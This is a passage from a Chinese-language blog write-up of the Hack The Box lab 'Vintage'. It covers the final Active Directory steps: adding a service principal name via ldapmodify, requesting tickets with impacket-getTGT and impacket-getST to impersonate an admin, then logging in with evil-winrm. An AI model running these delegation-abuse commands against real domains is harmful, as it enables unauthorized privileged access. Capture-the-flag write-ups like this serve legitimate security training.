+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=C.Neri@DC01.vintage.htb.ccache ldapmodify -Q -Y GSSAPI -H ldap://dc01.vintage.htb &lt;&lt; EOF</span><br><span class="line">dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb</span><br><span class="line">changetype: modify</span><br><span class="line">add: servicePrincipalName</span><br><span class="line">servicePrincipalName: pwn/pwn             </span><br><span class="line">EOF</span><br><span class="line">modifying entry &quot;CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb&quot;</span><br></pre></td></tr></table></figure>
+
+<p>生成svc票据</p>
+<ul>
+<li>impacket-getTGT -dc-ip 10.10.11.45 ‘vintage.htb&#x2F;svc_ldap‘@DC01.vintage.htb</li>
+</ul>
+<p>最后生成模拟的票据</p>
+<ul>
+<li>KRB5CCNAME&#x3D;<a href="mailto:&#115;&#x76;&#x63;&#x5f;&#x6c;&#100;&#97;&#x70;&#x40;&#x44;&#67;&#x30;&#x31;&#x2e;&#x76;&#x69;&#x6e;&#116;&#x61;&#103;&#x65;&#x2e;&#104;&#x74;&#x62;&#x2e;&#99;&#x63;&#x61;&#x63;&#104;&#101;">&#115;&#x76;&#x63;&#x5f;&#x6c;&#100;&#97;&#x70;&#x40;&#x44;&#67;&#x30;&#x31;&#x2e;&#x76;&#x69;&#x6e;&#116;&#x61;&#103;&#x65;&#x2e;&#104;&#x74;&#x62;&#x2e;&#99;&#x63;&#x61;&#x63;&#104;&#101;</a> impacket-getST -k -no-pass -spn ‘HTTP&#x2F;DC01.vintage.htb’ -impersonate ‘L.Bianchi_adm’ -dc-ip 10.10.11.45 ‘vintage.htb&#x2F;svc_ldap‘@DC01.vintage.htb</li>
+</ul>
+<p>用票据登录，验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=L.Bianchi_adm@HTTP_DC01.vintage.htb@VINTAGE.HTB.ccache evil-winrm -i DC01.vintage.htb -r vintage.htb</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/07/HTB-Vintage/">http://example.com/2025/05/07/HTB-Vintage/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/05/07/HTB-bigbang/" title="HTB-bigbang"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">HTB-bigbang</div></div><div class="info-2"><div class="info-item-1">HTB-bigbangindex页面又文件上传  存在插件漏洞  去readme.txt可以看到版本号为2.7.7 然后参考漏洞复现  https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8  复现 cat 1.php  123456789101112131415161718192021&lt;?phpclass Evil&#123;  public function __wakeup() : void &#123;    die(&quot;Arbitrary Deserialization&quot;);  &#125;&#125;//create new Phar$phar = new...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/07/HTB-bigbang/" title="HTB-bigbang"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-07</div><div class="info-item-2">HTB-bigbang</div></div><div class="info-2"><div class="info-item-1">HTB-bigbangindex页面又文件上传  存在插件漏洞  去readme.txt可以看到版本号为2.7.7 然后参考漏洞复现  https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8  复现 cat 1.php  123456789101112131415161718192021&lt;?phpclass Evil&#123;  public function __wakeup() : void &#123;    die(&quot;Arbitrary Deserialization&quot;);  &#125;&#125;//create new Phar$phar = new...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Vintage"><span class="toc-number">1.</span> <span class="toc-text">HTB-Vintage</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8kali%E6%A8%A1%E6%8B%9F%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.</span> <span class="toc-text">用kali模拟域用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PRE-WINDOWS-2000-COMPATIBLE-ACCESS"><span class="toc-number">1.1.1.</span> <span class="toc-text">PRE-WINDOWS 2000 COMPATIBLE ACCESS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.2.</span> <span class="toc-text">获取第二个票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%AC%E4%B8%89%E4%B8%AA%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.3.</span> <span class="toc-text">获取第三个票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readgmsapasswrod%E6%9D%83%E9%99%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">readgmsapasswrod权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1-%E8%8E%B7%E5%8F%96%E7%AC%AC4%E4%B8%AA%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.4.</span> <span class="toc-text">flag1+获取第4个票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DPAPI-%E8%8E%B7%E5%8F%96%E7%AC%AC5%E4%B8%AA%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.5.</span> <span class="toc-text">DPAPI+获取第5个票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">1.5.1.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.5.2.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.3.</span> <span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.6.</span> <span class="toc-text">基于资源的约束委派</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/07/HTB-Vintage/" title="HTB-Vintage">HTB-Vintage</a><time datetime="2025-05-07T11:11:00.000Z" title="Created 2025-05-07 19:11:00">2025-05-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/07/HTB-bigbang/" title="HTB-bigbang">HTB-bigbang</a><time datetime="2025-05-07T11:10:47.000Z" title="Created 2025-05-07 19:10:47">2025-05-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/2025TGctf/" title="2025TGctf">2025TGctf</a><time datetime="2025-04-27T08:36:37.000Z" title="Created 2025-04-27 16:36:37">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" title="免杀过火绒思路整理">免杀过火绒思路整理</a><time datetime="2025-04-27T08:28:12.000Z" title="Created 2025-04-27 16:28:12">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/THM-Ra2/" title="THM-Ra2">THM-Ra2</a><time datetime="2025-04-03T10:32:00.000Z" title="Created 2025-04-03 18:32:00">2025-04-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
